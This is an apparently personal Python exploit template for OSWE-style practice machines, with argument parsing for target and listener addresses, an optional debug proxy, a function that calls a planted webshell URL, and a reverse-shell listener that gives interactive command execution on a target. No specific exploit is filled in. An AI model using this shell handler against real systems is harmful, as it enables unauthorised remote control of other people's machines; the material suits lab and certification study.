# Exploit Template for use in future

# https://github.com/Z3R013x/OSWE-Like-0Click
# https://pwnit.io/category/oswe-like-machines/

import requests
import argparse
from string import printable, ascii_lowercase
import random
import sys
from os import path
from threading import Timer
import socket
import time


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def print_warning(text):
    print(f"{bcolors.WARNING}[-] {text}{bcolors.ENDC}")


def print_success(text):
    print(f"{bcolors.OKGREEN}[+] {text}{bcolors.ENDC}")


def print_info(text):
    print(f"{bcolors.OKCYAN}[*] {text}{bcolors.ENDC}")


def print_fail(text):
    print(f"{bcolors.FAIL}[!] {text}{bcolors.ENDC}")


def get_rev_shell(lhost, lport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((lhost, lport))
    s.listen()
    print_info("Listening on port " + str(lport)+ ", and triggering reverse shell")
    t = Timer(2, trigger_webshell, "URL_ARG")  # Delayed Call
    t.start()
    print_info("Triggered")
    conn, addr = s.accept()
    print_success('PWNED! ' + str(addr))
    print_success('Spawning Reverse Shell!')
    while True:
        #Receive data from the target and get user input
        ans = conn.recv(1024).decode()
        sys.stdout.write("\n"+ans)
        try:
            ans = conn.recv(1024).decode()
            sys.stdout.write("\n"+ans)
        except:
            pass
        command = input()

        #Send command
        command += "\n"
        conn.send(command.encode())
        time.sleep(1)

        #Remove the output of the "input()" function
        sys.stdout.write("\033[A" + ans.split("\n")[-1])

def generate_random_string(length):
    return ''.join(random.choice(ascii_lowercase) for _ in range(length))


def trigger_webshell(url):
    try:
        requests.get(f"{url}", timeout=86400)
    except requests.exceptions.Timeout:
        pass  # expected one
    except Exception as e:
        print_fail(f"Unexpected error occured: {str(e)}")


parser = argparse.ArgumentParser(description='exploit configuration',
                                 formatter_class=argparse.ArgumentDefaultsHelpFormatter)

parser.add_argument('-t', '--rhost', type=str, help="Target IP", required=True)
parser.add_argument('-rp', '--rport', type=int, help="Target Port (Default 80)", default="80", required=False)
parser.add_argument('-l', '--lhost', type=str, help="Local IP", required=True)
parser.add_argument('-lp', '--lport', type=int, help="Local Port (Default 4444)", default="4444", required=False)
parser.add_argument('-pr', '--proto', type=str, help="Target Protocol (Default http)", default="http", required=False)
parser.add_argument('-d', '--debug-proxy', type=str,
                    help="IP:PORT of HTTP Proxy, if passed, all requests will go trough proxy Example: -d 127.0.0.1:8080", required=False,
                    default="")

args = parser.parse_args()

proxies = {"http": f"{args.debug_proxy}"}

req_sess = requests.session()

if args.debug_proxy != "":
    req_sess.proxies.update(proxies)

if __name__ == "__main__":
    print_success("Do your magic!")
